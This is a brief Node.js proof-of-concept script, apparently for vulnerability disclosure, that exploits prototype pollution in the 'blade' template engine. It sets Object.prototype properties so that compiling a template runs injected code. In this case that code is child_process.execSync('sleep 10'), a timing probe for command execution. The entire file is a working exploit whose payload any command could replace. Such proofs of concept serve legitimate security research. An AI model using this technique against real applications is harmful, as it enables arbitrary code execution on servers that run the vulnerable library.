const blade = require('blade');
const fs = require('fs');
const path = require('path');

// The template will broken but our injected code will be executed
Object.prototype.value = "somevalue"
Object.prototype.output = {
    to: "global.process.mainModule.require('child_process').execSync('sleep 10')\nxxx"
}

// This template includes the `render` directive
const mainFilePath = path.join(__dirname, '/views/functions_and_block.blade');

fs.readFile(mainFilePath, 'utf8', (err, mainFile) => {
    if (err) throw err;

    blade.compile(mainFile, { filename: mainFilePath, debug: true }, (err, tmpl) => {
        if (err) throw err;

        tmpl({}, function(err, html) {
            if (err) throw err;
            console.log(html);
        });
    });
});